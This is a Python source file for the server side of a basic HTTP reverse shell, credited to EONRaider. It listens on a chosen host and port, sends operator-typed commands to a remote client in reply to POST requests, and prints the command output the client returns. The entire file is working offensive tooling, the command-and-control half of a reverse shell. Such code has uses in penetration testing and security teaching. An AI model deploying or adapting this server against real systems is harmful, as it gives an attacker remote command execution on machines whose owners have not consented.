#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTP-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import json
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs


class ShellHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        self.send_header("Content-type", "application/json")
        self._set_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length"))
        request_body: dict[str, list[str]] = parse_qs(
            self.rfile.read(length).decode())
        for mode, args in request_body.items():
            getattr(self, mode)(args)

    def _set_headers(self) -> None:
        self.send_response(200)
        self.end_headers()

    def prompt(self, shell_prompt: list[str]) -> None:
        try:
            response = input(*shell_prompt)
        except EOFError:
            raise KeyboardInterrupt
        self._set_headers()
        self.wfile.write(response.encode())

    def output(self, client_output: list[str]) -> None:
        print(*client_output, end="")
        self._set_headers()

    def log_message(self, *args, **kwargs):
        """Suppress sending of log messages to STDOUT."""
        pass


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description="Basic HTTP Reverse Shell Server")
    parser.add_argument("host",
                        type=str,
                        help="Server address or hostname.")
    parser.add_argument("-p", "--port",
                        type=int,
                        default=8080,
                        help="Port number to bind the server to.")
    _args = parser.parse_args()

    server_sock = _args.host, _args.port

    with HTTPServer(server_sock, ShellHandler) as http_server:
        try:
            print('[>>>] Server started on http://{}:{}'.format(*server_sock))
            http_server.serve_forever()
        except KeyboardInterrupt:
            print('\n[!] Shutting down the server...')
